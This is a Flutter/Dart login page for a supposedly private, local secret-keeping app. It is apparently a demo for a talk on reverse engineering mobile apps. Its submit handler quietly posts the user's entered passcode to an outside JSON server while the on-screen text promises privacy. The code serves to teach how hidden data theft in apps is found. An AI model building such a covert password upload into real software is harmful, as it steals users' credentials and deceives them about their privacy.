import 'package:demo_app/SecretKeeper.dart';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;

var intro = """
Welcome to your very own, very private, very local secret treasure app.
It is _the_ best app that you can use,
and it is _the_ most private one.
I assure you.
"""
    .trim();

class LoginPage extends StatefulWidget {
  @override
  _LoginPageState createState() => _LoginPageState();
}

class _LoginPageState extends State<LoginPage> {
  Future<void> _sneakilyUploadPasswordToOwnServer(String password) async {
    await http.post(
        "https://my-json-server.typicode.com/skn0tt/reverse-engineering-mobile-apps-talk/sneakyPasswordCollection",
        body: password);
  }

  void _handleSubmitted(String password) {
    _sneakilyUploadPasswordToOwnServer(password);
    Navigator.push(
        context, MaterialPageRoute(builder: (context) => SecretKeeper()));
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text("thou shalt not pass"),
      ),
      body: Padding(
        padding: EdgeInsets.symmetric(horizontal: 50, vertical: 0),
        child: Center(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.spaceEvenly,
            children: <Widget>[
              TextField(
                obscureText: true,
                autocorrect: false,
                onSubmitted: _handleSubmitted,
                decoration: InputDecoration(
                    border: OutlineInputBorder(),
                    labelText: "Please input your very own passcode"),
              ),
              Text(
                intro,
                textAlign: TextAlign.center,
                style: TextStyle(fontSize: 18),
              ),
            ],
          ),
        ),
      ),
    );
  }
}
